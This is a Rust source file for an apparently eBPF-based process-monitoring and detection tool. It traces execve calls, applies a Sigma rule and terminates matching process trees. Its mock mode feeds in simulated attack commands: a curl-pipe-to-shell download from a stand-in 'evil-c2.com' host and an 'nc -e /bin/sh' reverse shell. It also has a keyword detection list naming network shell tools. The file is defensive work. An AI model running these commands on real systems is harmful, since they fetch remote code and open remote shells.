mod telemetry;
mod enrichment;
mod mitigation;
mod pipeline;
mod tui;

use aya::Bpf;
use aya::programs::TracePoint;
use aya::maps::RingBuf;
use std::convert::TryInto;
use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::signal;
use std::env;
use std::time::{SystemTime, UNIX_EPOCH, Duration, Instant};
use parking_lot::RwLock;

use spectre_rules::{SigmaRule, SigmaEngine};
use spectre_graph::{ProcessGraph, ProcessKey};
use tui::{TuiApp, TuiRunner, UiMessage, UiEventItem, UiAlertItem, UiMetrics};

const ARGS_BUF_SIZE: usize = 2048;

#[repr(C)]
#[derive(Debug)]
struct ExecveEvent {
    pid: u32,
    ppid: u32,
    uid: u32,
    args_count: u32,
    args_size: u32,
    comm: [u8; 16],
    args_data: [u8; ARGS_BUF_SIZE],
}

fn now_ns() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64
}

fn format_time_now() -> String {
    let dur = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    let total_secs = dur.as_secs();
    let secs = total_secs % 60;
    let mins = (total_secs / 60) % 60;
    let hours = (total_secs / 3600) % 24;
    format!("{:02}:{:02}:{:02}", hours, mins, secs)
}

fn parse_cmdline(event: &ExecveEvent) -> (String, Vec<String>) {
    let size = (event.args_size as usize).min(ARGS_BUF_SIZE);
    let slice = &event.args_data[..size];
    let args: Vec<String> = slice
        .split(|&b| b == 0)
        .filter(|chunk| !chunk.is_empty())
        .map(|chunk| String::from_utf8_lossy(chunk).to_string())
        .collect();

    let full_cmdline = if !args.is_empty() {
        args.join(" ")
    } else {
        let comm = String::from_utf8_lossy(&event.comm);
        comm.trim_matches(char::from(0)).to_string()
    };

    (full_cmdline, args)
}

fn load_default_rules() -> SigmaEngine {
    let yaml = r#"
title: "Webshell and Suspicious Download Detection"
id: "spectre-v2-rule-1"
detection:
  selection_tools:
    CommandLine|contains:
      - "curl"
      - "wget"
      - "python"
      - "bash"
      - "nc"
  selection_suspicious:
    CommandLine|contains:
      - "http://"
      - "https://"
      - "-c"
      - "-e /bin"
      - "sh"
  filter_safe:
    User: "authorized_updater"
  condition: "(selection_tools and selection_suspicious) and not filter_safe"
"#;
    let rule: SigmaRule = serde_yaml::from_str(yaml).expect("Failed to parse default Sigma rule");
    SigmaEngine::parse(&rule).expect("Failed to compile Sigma rule")
}

fn spawn_background_gc(graph: Arc<RwLock<ProcessGraph>>) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(2));
        interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);

        loop {
            interval.tick().await;
            let now = now_ns();
            let mut has_more = true;

            while has_more {
                let stats = {
                    let mut g = graph.write();
                    g.prune_expired_budgeted(now, 256)
                };
                has_more = stats.has_more;
                if has_more {
                    tokio::task::yield_now().await;
                }
            }
        }
    })
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let args: Vec<String> = env::args().collect();
    let mock_mode = args.contains(&"--mock".to_string());
    let tui_mode = args.contains(&"--tui".to_string());

    if !tui_mode {
        env_logger::init();
    }

    let is_running = Arc::new(AtomicBool::new(true));

    let graph = Arc::new(RwLock::new(ProcessGraph::new(60_000_000_000)));
    let _gc_handle = spawn_background_gc(Arc::clone(&graph));

    let stats = Arc::new(pipeline::PipelineStats::new());
    
    // TUI channel and thread setup
    let (ui_tx, ui_rx) = if tui_mode {
        let (tx, rx) = tokio::sync::mpsc::channel::<UiMessage>(500);
        (Some(tx), Some(rx))
    } else {
        (None, None)
    };

    let tui_handle = if let Some(mut rx) = ui_rx {
        let is_running_clone = Arc::clone(&is_running);
        Some(std::thread::spawn(move || {
            let mut runner = match TuiRunner::init() {
                Ok(r) => r,
                Err(e) => {
                    eprintln!("Failed to initialize TUI: {}", e);
                    is_running_clone.store(false, Ordering::SeqCst);
                    return;
                }
            };
            let mut app = TuiApp::new(mock_mode);
            while !app.should_quit && is_running_clone.load(Ordering::SeqCst) {
                while let Ok(msg) = rx.try_recv() {
                    app.handle_message(msg);
                }
                if runner.render(&app).is_err() {
                    break;
                }
                if TuiRunner::handle_input(&mut app).is_err() {
                    break;
                }
            }
            is_running_clone.store(false, Ordering::SeqCst);
        }))
    } else {
        None
    };

    // Metrics reporter setup
    if tui_mode {
        let stats_c = Arc::clone(&stats);
        let graph_c = Arc::clone(&graph);
        let ui_tx_c = ui_tx.clone().unwrap();
        let is_running_c = Arc::clone(&is_running);

        tokio::spawn(async move {
            let mut ticker = tokio::time::interval(Duration::from_millis(500));
            ticker.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);
            let mut last_events = 0;
            let mut last_tick = Instant::now();

            while is_running_c.load(Ordering::SeqCst) {
                ticker.tick().await;
                let now = Instant::now();
                let elapsed_sec = now.duration_since(last_tick).as_secs_f64().max(0.001);
                last_tick = now;

                let total_ingested = stats_c.events_ingested.load(Ordering::Relaxed);
                let rate = ((total_ingested.saturating_sub(last_events)) as f64 / elapsed_sec) as u64;
                last_events = total_ingested;

                let (nodes, tree_lines) = {
                    let g = graph_c.read();
                    (g.node_count(), g.format_recent_forest(25))
                };

                let m = UiMetrics {
                    events_total: total_ingested,
                    events_rate: rate,
                    alerts_total: stats_c.alerts_triggered.load(Ordering::Relaxed),
                    drops_total: stats_c.dropped_events.load(Ordering::Relaxed),
                    graph_nodes: nodes,
                };

                let _ = ui_tx_c.try_send(UiMessage::Metrics(m));
                let _ = ui_tx_c.try_send(UiMessage::Tree(tree_lines));
            }
        });
    } else {
        let _metrics_handle = pipeline::spawn_metrics_reporter(Arc::clone(&stats), Duration::from_secs(5));
        println!("🛡️  Spectre V2 Initialized: Loaded Sigma Rules, StableDiGraph & Background GC Worker");
    }

    let engine = load_default_rules();

    if mock_mode {
        if !tui_mode {
            println!("🚀 Running in MOCK Mode (Simulating kernel telemetry without root)...");
        }
        let simulated_events = vec![
            (1001, 1, "bash", vec!["bash", "-c", "curl http://evil-c2.com/malware.sh | sh"]),
            (1002, 1001, "curl", vec!["curl", "http://evil-c2.com/malware.sh"]),
            (1003, 1, "systemd", vec!["/usr/lib/systemd/systemd-journald"]),
            (1004, 1001, "python3", vec!["python3", "-c", "import socket; s=socket.socket()"]),
            (1005, 1, "sshd", vec!["/usr/sbin/sshd", "-D"]),
            (1006, 1005, "bash", vec!["bash", "--login"]),
            (1007, 1006, "nc", vec!["nc", "-e /bin/sh", "192.168.1.50", "4444"]),
            (1008, 1, "dockerd", vec!["/usr/bin/dockerd"]),
        ];

        let mut idx = 0;
        while is_running.load(Ordering::SeqCst) {
            tokio::select! {
                _ = signal::ctrl_c() => {
                    is_running.store(false, Ordering::SeqCst);
                    break;
                }
                _ = tokio::time::sleep(Duration::from_millis(1000)) => {
                    if !is_running.load(Ordering::SeqCst) {
                        break;
                    }
                    let (pid, ppid, comm, cmd_args) = &simulated_events[idx % simulated_events.len()];
                    idx += 1;

                    let cmdline = cmd_args.join(" ");
                    let ts = now_ns();
                    stats.inc_ingested();

                    if let Some(tx) = &ui_tx {
                        let item = UiEventItem {
                            timestamp: format_time_now(),
                            event_type: "EXEC".to_string(),
                            pid: *pid,
                            ppid: *ppid,
                            comm: comm.to_string(),
                            cmdline: cmdline.clone(),
                        };
                        let _ = tx.try_send(UiMessage::Event(item));
                    } else {
                        println!("[EVENT] PID: {} | PPID: {} | Comm: {} | CmdLine: {}", pid, ppid, comm, cmdline);
                    }

                    let child_key = ProcessKey::new(*pid, ts);
                    {
                        let mut g = graph.write();
                        g.record_spawn_by_ppid(*ppid, child_key, comm, &cmdline, 1000, ts);
                    }

                    let mut event_map = HashMap::new();
                    event_map.insert("Image".to_string(), comm.to_string());
                    event_map.insert("CommandLine".to_string(), cmdline.clone());
                    event_map.insert("User".to_string(), "www-data".to_string());

                    {
                        let g = graph.read();
                        enrichment::enrich_event_from_graph(&g, &child_key, &mut event_map);
                    }

                    if engine.evaluate(&event_map) {
                        stats.inc_alerts();
                        let mitigation = mitigation::MitigationController::new();
                        let mit_result = mitigation.terminate_process_tree(*pid, None);
                        if mit_result.is_ok() {
                            stats.inc_mitigations();
                        }

                        if let Some(tx) = &ui_tx {
                            let alert_item = UiAlertItem {
                                timestamp: format_time_now(),
                                rule_id: engine.rule_id.clone(),
                                rule_title: engine.rule_title.clone(),
                                pid: *pid,
                                comm: comm.to_string(),
                                parent_comm: event_map.get("ParentImage").cloned().unwrap_or_else(|| "unknown".to_string()),
                                cmdline: cmdline.clone(),
                            };
                            let _ = tx.try_send(UiMessage::Alert(alert_item));
                        } else {
                            println!("🚨 [ALERT] Sigma Rule Triggered: '{}' (ID: {})", engine.rule_title, engine.rule_id);
                            match mit_result {
                                Ok(killed) => {
                                    println!("   ⚔️  [MITIGATION] Containment executed: safely terminated process tree ({:?})", killed);
                                }
                                Err(e) => println!("   ⚠️  [MITIGATION] Safety policy skipped/blocked termination: {}", e),
                            }
                            println!("   Offender PID: {} | Cmd: {}", pid, cmdline);

                            let g = graph.read();
                            let ancestors = g.resolve_ancestors(&child_key, 5);
                            println!("   Ancestry Lineage ({} levels):", ancestors.len());
                            for (i, anc) in ancestors.iter().enumerate() {
                                println!("     [{}] PID: {} (Comm: {}, Cmd: {})", i + 1, anc.key.pid, anc.comm, anc.cmdline);
                            }
                        }
                    }
                }
            }
        }
    } else {
        let bpf_path = if std::path::Path::new("ebpf-c/sensor.o").exists() {
            "ebpf-c/sensor.o"
        } else if std::path::Path::new("../ebpf-c/sensor.o").exists() {
            "../ebpf-c/sensor.o"
        } else {
            "sensor.o"
        };
        if !tui_mode {
            println!("Loading eBPF object from {}", bpf_path);
        }
        let mut bpf = Bpf::load_file(bpf_path)?;
        
        let program: &mut TracePoint = bpf.program_mut("handle_execve").unwrap().try_into()?;
        program.load()?;
        program.attach("syscalls", "sys_enter_execve")?;
        if !tui_mode {
            println!("Attached tracepoint syscalls:sys_enter_execve!");
        }
        
        let mut ring_buf = RingBuf::try_from(bpf.map_mut("events").unwrap())?;
        if !tui_mode {
            println!("Waiting for real kernel process events... Press Ctrl-C to quit.");
        }
        
        while is_running.load(Ordering::SeqCst) {
            tokio::select! {
                _ = signal::ctrl_c() => {
                    is_running.store(false, Ordering::SeqCst);
                    break;
                }
                _ = tokio::time::sleep(Duration::from_millis(5)) => {
                    if !is_running.load(Ordering::SeqCst) {
                        break;
                    }
                    let ts = now_ns();
                    while let Some(item) = ring_buf.next() {
                        let data = &*item;
                        if data.len() >= std::mem::size_of::<ExecveEvent>() {
                            let ptr = data.as_ptr() as *const ExecveEvent;
                            let event: &ExecveEvent = unsafe { &*ptr };
                            
                            let (cmdline, _args) = parse_cmdline(event);
                            let comm = String::from_utf8_lossy(&event.comm);
                            let comm_clean = comm.trim_matches(char::from(0));
                            
                            stats.inc_ingested();

                            if let Some(tx) = &ui_tx {
                                let ui_item = UiEventItem {
                                    timestamp: format_time_now(),
                                    event_type: "EXEC".to_string(),
                                    pid: event.pid,
                                    ppid: event.ppid,
                                    comm: comm_clean.to_string(),
                                    cmdline: cmdline.clone(),
                                };
                                let _ = tx.try_send(UiMessage::Event(ui_item));
                            } else {
                                println!("[EVENT] PID: {} | PPID: {} | Comm: {} | CmdLine: {}", 
                                    event.pid, event.ppid, comm_clean, cmdline);
                            }
                            
                            let child_key = ProcessKey::new(event.pid, ts);
                            {
                                let mut g = graph.write();
                                g.record_spawn_by_ppid(event.ppid, child_key, comm_clean, &cmdline, event.uid, ts);
                            }
                            
                            let mut event_map = HashMap::new();
                            event_map.insert("Image".to_string(), comm_clean.to_string());
                            event_map.insert("CommandLine".to_string(), cmdline.clone());
                            event_map.insert("User".to_string(), format!("{}", event.uid));

                            {
                                let g = graph.read();
                                enrichment::enrich_event_from_graph(&g, &child_key, &mut event_map);
                            }
                            
                            if engine.evaluate(&event_map) {
                                stats.inc_alerts();
                                let mitigation = mitigation::MitigationController::new();
                                let mit_result = mitigation.terminate_process_tree(event.pid, None);
                                if mit_result.is_ok() {
                                    stats.inc_mitigations();
                                }

                                if let Some(tx) = &ui_tx {
                                    let alert_item = UiAlertItem {
                                        timestamp: format_time_now(),
                                        rule_id: engine.rule_id.clone(),
                                        rule_title: engine.rule_title.clone(),
                                        pid: event.pid,
                                        comm: comm_clean.to_string(),
                                        parent_comm: event_map.get("ParentImage").cloned().unwrap_or_else(|| "unknown".to_string()),
                                        cmdline: cmdline.clone(),
                                    };
                                    let _ = tx.try_send(UiMessage::Alert(alert_item));
                                } else {
                                    println!("🚨 [ALERT] Sigma Rule Triggered: '{}' (ID: {})", engine.rule_title, engine.rule_id);
                                    match mit_result {
                                        Ok(killed) => {
                                            println!("   ⚔️  [MITIGATION] Containment executed: safely terminated process tree ({:?})", killed);
                                        }
                                        Err(e) => println!("   ⚠️  [MITIGATION] Safety policy skipped/blocked termination: {}", e),
                                    }
                                    println!("   Offender PID: {} | Cmd: {}", event.pid, cmdline);

                                    let g = graph.read();
                                    let ancestors = g.resolve_ancestors(&child_key, 5);
                                    println!("   Ancestry Lineage ({} levels):", ancestors.len());
                                    for (i, anc) in ancestors.iter().enumerate() {
                                        println!("     [{}] PID: {} (Comm: {}, Cmd: {})", i + 1, anc.key.pid, anc.comm, anc.cmdline);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    is_running.store(false, Ordering::SeqCst);
    if let Some(h) = tui_handle {
        let _ = h.join();
    }

    Ok(())
}
